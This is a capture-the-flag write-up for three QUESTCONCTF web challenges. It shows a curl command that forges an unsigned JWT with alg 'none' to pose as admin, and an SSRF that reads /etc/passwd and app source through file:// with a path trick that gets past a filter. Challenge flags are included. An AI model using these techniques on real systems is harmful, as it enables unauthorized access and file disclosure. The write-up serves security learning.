-----------------

### CTF: QUESTCONCTF

------------------

![image](https://github.com/user-attachments/assets/201d3478-4cce-4604-a4d3-be0e79a1d0f1)

------------------

### Challenges:

- Web
  - Direction
  - Theadmin
  - Temp

------------------

### WEB:

### Direction:

![image](https://github.com/user-attachments/assets/4f776a65-e2c5-4f76-b044-18c3d0f4c467)

- I loaded the site and got this

![image](https://github.com/user-attachments/assets/c01101fe-8612-40fd-93de-7997ec52e9ff)

- I decided to check for the common file `robots.txt` that we all try to find and got a disallowed page.

![image](https://github.com/user-attachments/assets/29d877b6-a391-4a21-9497-0a8a4615cba0)

- I proceeded with curl and noticed an header containing a portion of the flag and automatically redirects to the next page.At first,I couldn't use `GET` for it.I used header `OPTIONS` to find allowed http headers.

![image](https://github.com/user-attachments/assets/9ae29c4e-5969-40cc-a455-77f463277e94)

- Flag portion 1 is shown below and the next flag stop will be the path in the `Location` header.

![image](https://github.com/user-attachments/assets/05c38c13-3f18-4440-bf62-8606f38c8a79)

- I wrote a <a href="https://github.com/SENSEiXENUS/senseixenus.github.io/blob/main/posts/ctf/QUESTcon24/scripts/direction.py">script</a> to automate it.

![image](https://github.com/user-attachments/assets/60983022-c410-4d09-9247-07294c1cdd14)

- Flag-: ```QUESTCON{mi3d1r3ct10n_15_4n_4r}```


-------------------

### Challenge 2: The Admin

![image](https://github.com/user-attachments/assets/2c893638-2ee5-4086-ba07-333a1ee1d40a)

- The index page contains the documentation for the api.Route `auth` takes in a username and returns a jwt token created with the username and route `access` takes in the cookie and displays the username.

![image](https://github.com/user-attachments/assets/0ca83b87-c8b8-4164-82f7-35f0b1b0180b)

![image](https://github.com/user-attachments/assets/d985d91e-3733-4d32-9587-6719bc838327)

- I was able to get the flag by setting the `alg` key to `none`.

```bash
curl https://questcon-theadmin.chals.io/access -H "Authorization: Bearer $(echo '{"alg":"none","typ":"JWT"}' | base64).eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzI5ODYwNTM2fQ"
{"flag":"QUESTCON{J3T_4lg0r1thm_15_vuln3r4bl3_70_n0n3}"}%
```

- Flag-:```QUESTCON{J3T_4lg0r1thm_15_vuln3r4bl3_70_n0n3}```

---------------------

### Challenge 3: TEMP

![image](https://github.com/user-attachments/assets/748470c8-b92f-4dc0-8d28-bb37d6de8963)

- I checked the source code aand noticed a `POST` request made to route `/api` which loads a url.

      fetch('/api', {
                      method: 'POST',
                      headers: {
                          'Content-Type': 'application/json',
                      },
                      body: JSON.stringify({ url: urlInput }),
                  })
- I made an http request to google and it worked.

      ❯ curl https://questcon-temp.chals.io/api -H "Content-Type: application/json" -d '{"url": "https://www.google.com"}'
      {"data":"<!doctype html><html itemscope=\"\" itemtype=\"http://schema.org/WebPage\" lang=\"en\"><head><meta content=\"Search the world's information, including webpages, images, videos and more. Google has many special features to help you find exactly what you're looking for.\" name=\"description\"><meta content=\"noodp, \" name=\"robots\"><meta content=\"text/html; charset=UTF-8\"

- I tried to read `/etc/passwd` with `file://` schema which did not work because it was filtered.Then, I tred `/etc/./passwd` which worked.

![image](https://github.com/user-attachments/assets/c76e76d3-230a-4c03-b7d0-40a5e0b293dd)

- I got the flag by reading the source code stored in `/app/app.py`.I got this idea because most ctf challenges are stored in `/app/app.py`.

![image](https://github.com/user-attachments/assets/a9abae67-3da3-4799-bd5d-7c495faa1b3c)

- Flag-: ```QUESTCON{r3c0ver_d3l3t3d_fil3}```

-------------------

### THANKS FOR READING

-------------------

### REFERENCES:

- [Direction's script](https://github.com/SENSEiXENUS/senseixenus.github.io/blob/main/posts/ctf/QUESTcon24/scripts/direction.py)
















